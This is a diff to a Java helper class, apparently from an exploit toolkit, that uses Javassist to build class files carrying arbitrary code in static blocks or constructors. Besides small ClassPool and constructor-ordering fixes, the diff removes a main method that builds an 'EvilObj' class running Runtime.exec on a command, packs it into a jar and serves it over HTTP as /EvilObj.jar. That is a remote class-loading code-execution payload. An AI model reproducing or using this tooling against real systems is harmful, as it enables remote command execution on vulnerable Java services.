@@ -17,7 +17,7 @@ public class ClassFiles {
 
 
     public static byte[] makeClassWithStaticBlock(String classname, String body) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
+        ClassPool pool = new ClassPool(true);
         CtClass cc = makeEmptyClassFile(pool, classname, null);
         insertStaticBlock(cc, body);
         return cc.toBytecode();
@@ -43,17 +43,18 @@ public class ClassFiles {
     }
 
     public static byte[] makeClassWithDefaultConstructor(String classname, String body) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
+        ClassPool pool = new ClassPool(true);// 防止同一个classname 多次创建而报错 不用defaultPool
         CtClass cc = makeEmptyClassFile(pool, classname, body);
         return cc.toBytecode();
     }
 
     public static CtClass makeEmptyClassFile(ClassPool pool, String classname, String body) throws Exception{
         CtClass cc = pool.makeClass(classname);
+
         if(body != null){
             CtConstructor constructor = CtNewConstructor.defaultConstructor(cc);
-            constructor.insertAfter(body);
             cc.addConstructor(constructor);
+            constructor.insertAfter(body);
         }
         return cc;
     }
@@ -104,18 +105,5 @@ public class ClassFiles {
     public static void insertMethod(CtClass cc, String src) throws CannotCompileException {
         CtMethod method = CtNewMethod.make(src, cc);
         cc.addMethod(method);
-    }
-
-
-
-    public static void main(String[] args) throws Exception {
-        String command = "ls";
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");";
-        byte[] bytecodes = ClassFiles.makeClassWithDefaultConstructor("EvilObj",cmd);
-        byte[] jar = ClassFiles.makeJarFile("EvilObj", bytecodes);
-        HTTPHelper.PayloadHandler handler = new HTTPHelper.PayloadHandler(jar);
-        HTTPHelper.makeSimpleHTTPServer(80, "/EvilObj.jar", handler);
     }
 }
